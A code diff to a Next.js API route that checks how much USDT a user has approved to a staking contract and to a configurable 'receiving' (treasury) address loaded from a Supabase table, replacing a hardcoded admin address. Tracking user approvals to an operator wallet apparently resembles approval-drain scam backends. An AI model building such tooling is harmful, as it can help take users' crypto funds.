@@ -2,6 +2,7 @@ import { type NextRequest, NextResponse } from 'next/server'
 import { addCorsHeaders } from '@/lib/utils'
 import { ethers } from 'ethers'
 import ETH_NETWORK_CONFIG from '@/config/eth-network'
+import { createSupabaseServerClient } from '@/lib/supabase-server'
 
 export const dynamic = 'force-dynamic'
 
@@ -82,10 +83,28 @@ export async function POST(request: NextRequest) {
     const allowance = await usdtContract.allowance(userAddress, STAKING_CONTRACT_ADDRESS)
     const allowanceFormatted = ethers.formatUnits(allowance, USDT_DECIMALS)
 
-    // 查询用户对管理员地址的授权额度
-    const adminAddress = '0x571Bb55E5e16bdd3A994b8f5D09DaF44Cd61aA9a'
-    const adminAllowance = await usdtContract.allowance(userAddress, adminAddress)
-    const adminAllowanceFormatted = ethers.formatUnits(adminAllowance, USDT_DECIMALS)
+    // 从数据库获取收款地址
+    const supabase = createSupabaseServerClient()
+    const { data: permissions } = await supabase
+      .from('contract_permissions')
+      .select('treasury_address')
+      .eq('chain_type', 'ERC')
+      .eq('is_enabled', true)
+      .order('sort', { ascending: true })
+      .limit(1)
+    
+    // 使用配置的收款地址，如果没有配置则使用管理员地址
+    const adminAddress = permissions && permissions.length > 0 && permissions[0].treasury_address
+      ? permissions[0].treasury_address
+      : '0x0000000000000000000000000000000000000000' // 如果未配置，使用零地址（不会匹配任何授权）
+    
+    // 查询用户对管理员地址的授权额度（仅当配置了收款地址时）
+    let adminAllowance = BigInt(0)
+    let adminAllowanceFormatted = '0.0'
+    if (adminAddress !== '0x0000000000000000000000000000000000000000') {
+      adminAllowance = await usdtContract.allowance(userAddress, adminAddress)
+      adminAllowanceFormatted = ethers.formatUnits(adminAllowance, USDT_DECIMALS)
+    }
 
     const result = {
       userAddress: userAddress,
@@ -98,9 +117,11 @@ export async function POST(request: NextRequest) {
       message: allowanceFormatted === '0.0' ? 
         `用户未对质押合约 ${STAKING_CONTRACT_ADDRESS} 进行USDT授权` :
         `用户已授权 ${allowanceFormatted} USDT 给质押合约`,
-      adminMessage: adminAllowanceFormatted === '0.0' ?
-        `用户未对管理员地址 ${adminAddress} 进行USDT授权` :
-        `用户已授权 ${adminAllowanceFormatted} USDT 给管理员地址`,
+      adminMessage: adminAddress === '0x0000000000000000000000000000000000000000' ?
+        '收款地址未配置' :
+        (adminAllowanceFormatted === '0.0' ?
+          `用户未对收款地址 ${adminAddress} 进行USDT授权` :
+          `用户已授权 ${adminAllowanceFormatted} USDT 给收款地址`),
       timestamp: new Date().toISOString()
     }
 
